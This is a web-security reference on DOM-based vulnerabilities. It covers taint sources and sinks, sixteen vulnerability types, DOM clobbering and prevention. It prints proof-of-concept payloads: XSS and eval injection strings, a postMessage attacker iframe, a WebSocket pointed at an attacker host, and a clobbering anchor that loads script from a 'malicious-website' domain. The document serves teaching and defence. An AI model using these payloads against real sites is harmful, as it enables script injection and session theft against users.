# DOM-based vulnerabilities — deep reference

Sources:
- https://portswigger.net/web-security/dom-based
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

## 1. The DOM & taint-flow model

DOM-based vulnerabilities are **client-side**: untrusted data flows from a **source**
(an entry point an attacker can influence) through the JS, and is passed to a
**sink** (a function/property that performs a dangerous action) without adequate
sanitization. Because fragment-based sources (`location.hash`) are never sent to the
server, these bugs are invisible to server-side logging/WAFs.

```
source (e.g. location.hash) --> [app JS, possibly transformed] --> sink (e.g. innerHTML)
                                                                     ^ vulnerability if unsanitized
```

To find them: enumerate sinks, then trace each backwards to see whether a controllable
source can reach it (taint analysis). Tools: Burp **DOM Invader**, DevTools sink
breakpoints, manual canary injection.

## 2. Controllable sources

Anything an attacker can influence in the victim's browser:

- `location` and its parts: `location.href`, `location.search`, `location.hash`,
  `location.pathname`
- `document.URL`, `document.documentURI`, `document.baseURI`
- `document.referrer` (controllable by linking from an attacker page)
- `window.name` (persists across navigations — set on attacker page, then navigate)
- `document.cookie`
- `localStorage`, `sessionStorage`
- `postMessage` web-message data (`event.data`)
- `history.pushState` / `replaceState` URL arguments
- Reflected/stored server responses parsed client-side (e.g. JSON fed to a sink)

## 3. Dangerous sinks

| Category | Sinks |
|---|---|
| HTML/script injection | `element.innerHTML`, `element.outerHTML`, `element.insertAdjacentHTML`, `document.write`, `document.writeln`, jQuery `$(...).html()`, `$.parseHTML` |
| Code execution | `eval`, `Function`, `setTimeout(str)`, `setInterval(str)`, `execScript`, `<script>.text/.textContent/.innerText`, `setAttribute('on*', ...)` |
| Navigation/redirect | `location`, `location.href`, `location.replace`, `location.assign`, `window.open` |
| Attribute/link | `element.src`, `element.href`, `element.action`, `element.setAttribute`, `iframe.srcdoc` |
| Request/transport | `XMLHttpRequest.open`/`.setRequestHeader`, `fetch`, `WebSocket()` |
| Storage/state | `document.cookie`, `localStorage.setItem`, `sessionStorage.setItem` |
| Data parsing | `JSON.parse`, `document.evaluate` (XPath), Web SQL `executeSql`, `RegExp` |
| File | `FileReader.readAsText` and path-controlled file APIs |

## 4. The 16 DOM-based vulnerability types

Each below: what it is, primary sink, and an illustrative vulnerable snippet.

### 4.1 DOM XSS
User-controllable source reaches an HTML/script sink → arbitrary JS in the origin.
Primary sink: `document.write` / `innerHTML`.
```javascript
// hash → innerHTML
document.getElementById('out').innerHTML = location.hash.slice(1);
// PoC: #<img src=x onerror=alert(document.domain)>
```

### 4.2 Open redirection
Source controls a navigation sink; victim is sent to attacker site.
Primary sink: `window.location`.
```javascript
let goto = location.hash.slice(1);
if (goto.startsWith('https:')) { location = goto; }  // bypass: https:evil? / //evil
```
Low severity alone; HIGH when it leaks OAuth/SSO tokens in the redirect.

### 4.3 Cookie manipulation
Source written into `document.cookie`; enables cookie injection / session fixation.
Primary sink: `document.cookie`.
```javascript
document.cookie = 'ref=' + location.search.slice(4);  // CRLF/extra-attr injection
```

### 4.4 JavaScript injection
Source flows into a code-eval sink → arbitrary JS.
Primary sink: `eval()`.
```javascript
eval('var data = ' + decodeURIComponent(location.hash.slice(1)));
// PoC: #1;alert(document.domain)
```

### 4.5 Document-domain manipulation
Source sets `document.domain`, relaxing same-origin policy across subdomains,
enabling cross-domain script access. Primary sink: `document.domain`.
```javascript
document.domain = location.hash.slice(1);
```

### 4.6 WebSocket-URL poisoning
Source controls the WebSocket endpoint → attacker MITM of WS traffic / data theft.
Primary sink: `WebSocket()`.
```javascript
var ws = new WebSocket(location.hash.slice(1));  // PoC: #wss://attacker/ws
```

### 4.7 Link manipulation
Source sets an element's `src`/`href`, e.g. injecting `javascript:` or attacker URLs.
Primary sink: `element.src` (also `.href`).
```javascript
document.getElementById('a').href = location.search.slice(1);
```

### 4.8 Web-message (postMessage) manipulation
A `message` event listener trusts `event.data` (no/weak origin check) and feeds a sink.
Primary sink: `postMessage()` receiving side → `eval`/`innerHTML`/`location`.
```javascript
window.addEventListener('message', function (e) { eval(e.data); });
```
PoC (attacker page):
```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```
Origin-check bypasses: `e.origin.indexOf('normal-website.com')` matches
`http://normal-website.com.evil.net`; `endsWith('normal-website.com')` matches
`http://evilnormal-website.com`. Require strict equality on origin.

### 4.9 Ajax request-header manipulation
Source controls a header value/name set on an XHR/fetch request.
Primary sink: `XMLHttpRequest.setRequestHeader()`.
```javascript
xhr.setRequestHeader('X-Custom', location.hash.slice(1));
```

### 4.10 Local file-path manipulation
Source controls a file path passed to a file API → reading attacker-chosen content.
Primary sink: `FileReader.readAsText()`.
```javascript
reader.readAsText(file, location.hash.slice(1));
```

### 4.11 Client-side SQL injection
Source flows into a Web SQL query (legacy WebSQL). Primary sink: `executeSql()`.
```javascript
db.transaction(t => t.executeSql("SELECT * FROM u WHERE n='" + name + "'"));
```

### 4.12 HTML5-storage manipulation
Source written into web storage; later trusted/read back into a sink.
Primary sink: `sessionStorage.setItem()` (and `localStorage.setItem`).
```javascript
sessionStorage.setItem('key', location.hash.slice(1));
```

### 4.13 Client-side XPath injection
Source concatenated into an XPath query. Primary sink: `document.evaluate()`.
```javascript
document.evaluate("//user[@name='" + name + "']", document);
```

### 4.14 Client-side JSON injection
Source injected into a string that is then `JSON.parse`d, altering parsed structure.
Primary sink: `JSON.parse()`.
```javascript
var obj = JSON.parse('{"q":"' + location.search.slice(3) + '"}');
```

### 4.15 DOM-data manipulation
Source written into a DOM attribute, changing app behavior (e.g. hidden form fields).
Primary sink: `element.setAttribute()`.
```javascript
el.setAttribute('data-role', location.hash.slice(1));
```

### 4.16 Denial of service (ReDoS)
Source used to build a RegExp or fed to a catastrophic-backtracking pattern → hang.
Primary sink: `RegExp()`.
```javascript
new RegExp(location.hash.slice(1)).test(longInput);
```

## 5. DOM clobbering

Used when XSS is impossible but you can inject HTML with whitelisted `id`/`name`
attributes (e.g. a sanitizer that strips scripts/events but keeps anchors/forms).
HTML elements with an `id` or `name` become accessible as named properties on
`document`/`window`, so injected markup can **overwrite (clobber) JS variables**.

Common vulnerable pattern:
```javascript
var someObject = window.someObject || {};   // fallback the attacker can forge
// ... later:
script.src = someObject.url;                 // sink steered by clobbered value
```

Clobber `someObject.url` using duplicate-id anchors (the duplicate ids form an
HTMLCollection, and a named child becomes a property):
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
`someObject` resolves to the collection; `.url` resolves to the second anchor's
`href`, so the script loads attacker JS.

HTMLCollection / property-shadowing trick — break a filter that iterates attributes:
```html
<form onclick=alert(1)><input id=attributes></form>
```
The injected `id=attributes` clobbers the form's `attributes` property with a DOM
node (no `.length`), so a sanitizer loop over `node.attributes` malfunctions and the
`onclick` survives.

Notes: anchor `href` is a reliable way to control a clobbered string value; you can
also clobber multi-level objects via nested forms/inputs and `name` chains.

## 6. Prevention

Primary rule (PortSwigger): "avoid allowing data from any untrusted source to
dynamically alter the value that is transmitted to any sink."

- **Avoid dangerous sinks**: prefer `textContent` over `innerHTML`; never pass
  untrusted strings to `eval`/`Function`/`setTimeout(string)`/`document.write`.
- **Sanitize/encode for the context**: HTML-encode for HTML, JS-escape for script,
  URL-encode for URLs. Use **DOMPurify** to sanitize HTML before insertion.
- **Validate redirects/links**: allowlist exact hosts; reject `javascript:`/`data:`
  and protocol-relative `//` unless intended; use strict comparisons.
- **postMessage**: verify `event.origin` with strict equality (not `indexOf`/
  `endsWith`) and validate message structure before use.
- **DOM clobbering defense**: when filtering the DOM, verify objects/functions are
  legitimate and **not DOM nodes** (e.g. check `instanceof`/`typeof`); avoid
  `x = window.x || {}` fallbacks; sanitize with DOMPurify (`SANITIZE_NAMED_PROPS`).
- **Trusted Types** (`Content-Security-Policy: require-trusted-types-for 'script'`)
  forces dangerous sinks to receive vetted `TrustedHTML`/`TrustedScript` objects,
  killing most DOM XSS classes at the sink.
